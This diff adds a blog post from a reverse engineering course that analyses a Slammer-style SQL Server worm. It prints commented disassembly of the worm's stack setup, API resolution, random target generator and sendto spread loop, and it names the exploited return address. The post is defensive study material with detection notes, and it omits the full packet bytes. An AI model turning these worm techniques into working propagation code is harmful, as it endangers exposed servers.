@@ -1,0 +1,103 @@
+<p>The companion to my <a href="wg2-rat-teardown.html">wg2 RAT teardown</a> is a 2003-era worm: an SQL Slammer / Sapphire style sample. For my reverse engineering course I produced a fully commented disassembly plus a stack-layout diagram, and this post is the condensed version.</p>
+<p>It's a nice contrast with wg2. wg2 is a big C++ program with a command loop. Slammer is <strong>376 bytes</strong> with no C2, no persistence and no commands. It does one thing, forever.</p>
+
+<h2>What it does, in one breath</h2>
+<p>A single UDP packet to SQL Server's resolution service (UDP 1434) overflows a stack buffer, redirects the return address to a <code>JMP ESP</code> gadget in <code>sqlsort.dll</code>, and lands in the worm body. The worm then resolves the few APIs it needs, opens a UDP socket, and sprays copies of itself at pseudo-random IPv4 addresses until the machine is turned off.</p>
+<pre><code>overflow 1434/udp -&gt; RET to JMP ESP -&gt; shellcode on stack
+  -&gt; build API names on the stack -&gt; LoadLibraryA / GetProcAddress
+  -&gt; GetTickCount (seed) -&gt; socket(UDP) -&gt; sendto() in an endless loop</code></pre>
+<p class="muted">I'm describing behavior and structure for defenders and students. I left out the full packet bytes on purpose.</p>
+
+<h2>Getting control</h2>
+<p>The first byte of the packet selects the vulnerable code path in the SQL Server parser. A long run of <code>0x01</code> filler overruns the buffer, and the saved return address is replaced with <code>0x42B0C9DC</code>, a <code>JMP ESP</code> inside <code>sqlsort.dll</code>. When the function returns, execution lands on ESP, which points at the worm. A short <code>jmp</code> hops over embedded data into a NOP sled.</p>
+<p>The worm doesn't get "called". It's reached by corrupting a return, which is why the stack matters so much for this sample.</p>
+
+<h2>The stack is the data section</h2>
+<p>There's no data segment and no import table. First the worm carves out workspace by pushing <code>0x01010101</code> 24 times (96 bytes) and sets <code>EBP = ESP</code>. Everything after that is an EBP-relative local variable. The filler value is chosen so the payload has no null bytes, which would truncate the overflow, and the worm even builds <code>0x04000000</code> with an XOR instead of writing the zeros.</p>
+<pre><code>mov  eax, 01010101h
+xor  ecx, ecx
+mov  cl, 18h          ; 24 iterations
+L: push eax
+   loop L             ; 96 bytes of workspace
+xor  eax, 05010101h   ; -&gt; 04000000h with no null bytes in the code
+push eax
+mov  ebp, esp</code></pre>
+
+<h3>Stack layout</h3>
+<pre><code>EBP-0x54  UDP socket handle
+EBP-0x50  sockaddr_in (random IP + port 1434)
+EBP-0x4C  PRNG seed / state  (starts from GetTickCount)
+EBP-0x48..0x40  saved handles: kernel32, GetTickCount name ptr, ws2_32
+EBP-0x3C  "sendto"
+EBP-0x34  "socket"
+EBP-0x2C  "kernel32.dll"
+EBP-0x20  "GetTickCount"
+EBP-0x10  "ws2_32.dll"</code></pre>
+
+<h2>Strings built backwards</h2>
+<p>API names are pushed as little-endian dwords, last chunk first, so they read correctly in memory. Short endings use a 16-bit <code>mov cx</code> so the upper bytes stay zero and the string is null-terminated for free.</p>
+<pre><code>push ecx              ; NUL
+push 6C6C642Eh        ; ".dll"
+push 32336C65h        ; "el32"
+push 6E72656Bh        ; "kern"  -&gt; kernel32.dll</code></pre>
+<p>That's the main tell when you're analyzing it: a long run of <code>push imm32</code> with printable ASCII constants means stack strings, and tools like <code>strings</code> will never see them.</p>
+
+<h2>Finding its APIs</h2>
+<p>With no imports, the worm borrows <code>sqlsort.dll</code>'s own import table. It calls <code>LoadLibraryA</code> through a known IAT slot for <code>kernel32.dll</code> and <code>ws2_32.dll</code>, then calls <code>GetProcAddress</code> through another slot. Because that slot differs between builds, it checks that the target starts with the expected prologue bytes (<code>55 8B EC 51</code>) and falls back to a second address if not.</p>
+<pre><code>esi = [IAT: LoadLibraryA]     ; call [esi]
+esi = [IAT: GetProcAddress?]  ; check first dword == 51EC8B55h
+                              ; no match -&gt; use the backup slot</code></pre>
+<p>It resolves <code>GetTickCount</code> and calls it. The return value isn't for timing, it's the seed for the target generator. Then it resolves <code>socket</code>, creates a UDP socket (<code>AF_INET</code>, <code>SOCK_DGRAM</code>, protocol 17) and resolves <code>sendto</code>, keeping the function pointer in <code>ESI</code> for the rest of its life.</p>
+
+<h2>Picking victims without a multiply</h2>
+<p>The target generator is a linear congruential generator, <code>seed = seed * 214013 + increment</code>. Instead of <code>imul</code>, the worm builds the multiplier from <code>lea</code>, shifts, an add and a sub, which keeps the encoding tiny and free of null bytes:</p>
+<pre><code>lea  ecx, [eax+eax*2]   ; 3x
+lea  edx, [eax+ecx*4]   ; 13x
+shl  edx, 4             ; 208x
+add  edx, eax           ; 209x
+shl  edx, 8             ; 53504x
+sub  edx, eax           ; 53503x
+lea  eax, [eax+edx*4]   ; 214013x   (0x343FD)
+add  eax, ebx           ; + increment
+mov  [ebp-4Ch], eax     ; new state, also the next target IP</code></pre>
+<p>I like this part because the whole generator is eight instructions and you can verify the constant by hand. The new state is stored back at <code>EBP-0x4C</code> and doubles as the destination address.</p>
+
+<h2>The spread loop</h2>
+<pre><code>push 10h                 ; tolen = sizeof(sockaddr_in)
+lea  eax, [ebp-50h]      ; to
+push eax
+xor  ecx, ecx
+push ecx                 ; flags = 0
+xor  cx, 0178h           ; len = 376
+push ecx
+lea  eax, [ebp+3]        ; buf = start of worm body
+push eax
+mov  eax, [ebp-54h]      ; socket
+push eax
+call esi                 ; sendto(s, buf, 376, 0, &amp;to, 16)
+jmp  short PRNG          ; never returns</code></pre>
+<p>Single datagram, no handshake, no reply expected. That's why it spread so fast: with UDP there's nothing to wait on, so the only limit is how quickly <code>sendto</code> can be called and how fast the uplink is.</p>
+
+<h2>wg2 vs. Slammer</h2>
+<pre><code>                wg2 (RAT)               Slammer-style worm
+language        C++                     hand-written asm shellcode
+size            full PE32               376 bytes
+transport       HTTP/HTTPS (TCP)        one UDP datagram
+control         C2 loop, 11 commands    none
+persistence     beacon loop             none (memory only)
+goal            remote administration   replicate</code></pre>
+
+<h2>Detection and defense notes</h2>
+<ul>
+<li><strong>Network:</strong> a host sending a flood of identical ~376-byte UDP packets to port 1434 across wide address ranges is the whole signature. Flow-based detection (fan-out rate to one port) works even if the payload changes.</li>
+<li><strong>Exposure:</strong> the resolution service shouldn't be reachable from untrusted networks. Filtering 1434/udp at the edge stops this outright.</li>
+<li><strong>Memory-only:</strong> nothing touches disk, so file-based AV has nothing to scan. Patching the SQL Server flaw is the real fix.</li>
+<li><strong>Analysis tip:</strong> when a sample has no imports and a wall of <code>push imm32</code> ASCII, decode the stack strings first. The rest of the logic falls out of those names.</li>
+</ul>
+
+<h2>What I took away</h2>
+<ul>
+<li>Drawing the stack diagram first made the disassembly readable. Without it, every <code>[ebp-xx]</code> is a mystery.</li>
+<li>Tiny does not mean simple. Null-byte avoidance shaped almost every instruction choice.</li>
+<li>Comparing it with wg2 clarified how different "malware" can be: one waits for orders, the other never stops to listen.</li>
+</ul>
